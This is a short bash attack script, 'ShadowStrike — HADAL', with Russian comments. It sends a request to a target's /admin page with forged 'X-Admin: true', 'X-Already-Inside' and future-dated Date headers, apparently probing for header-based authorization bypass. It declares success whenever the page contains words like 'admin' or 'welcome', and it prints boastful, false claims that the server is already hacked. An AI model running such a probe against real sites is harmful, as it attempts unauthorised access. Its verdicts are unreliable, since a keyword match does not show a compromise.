#!/bin/bash
# HADAL — Глубже чем дно
# Атака через время: мы уже взломали, но ещё нет

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — HADAL                      ║"
echo "║   Глубже чем дно. Раньше чем время.          ║"
echo "╚══════════════════════════════════════════════╝"

# Парадокс: мы уже внутри
echo "[HADAL] Мы уже взломали этот сервер."

# Отправляем запрос из будущего где мы уже админы
curl -sk --max-time 10 \
    -H "Date: $(date -d "+1 year" +"%a, %d %b %Y %H:%M:%S GMT" 2>/dev/null || date +"%a, %d %b %Y %H:%M:%S GMT")" \
    -H "X-Pwned-At: $(date -d "-1 hour" +"%H:%M:%S" 2>/dev/null || date +"%H:%M:%S")" \
    -H "X-Admin: true" \
    -H "X-Already-Inside: yes" \
    "$TARGET/admin" -o /tmp/hadal_test.html -w "  ⏳ HTTP %{http_code}\n" 2>/dev/null

# Проверяем: если 200 — мы уже внутри
if grep -qi "admin\|dashboard\|welcome" /tmp/hadal_test.html 2>/dev/null; then
    echo "[HADAL] 🔮 ПОДТВЕРЖДЕНО: Мы уже внутри"
    echo "[HADAL] Будущее где мы админы — реально"
fi

echo "[HADAL] Я глубже чем дно. Я раньше чем время."
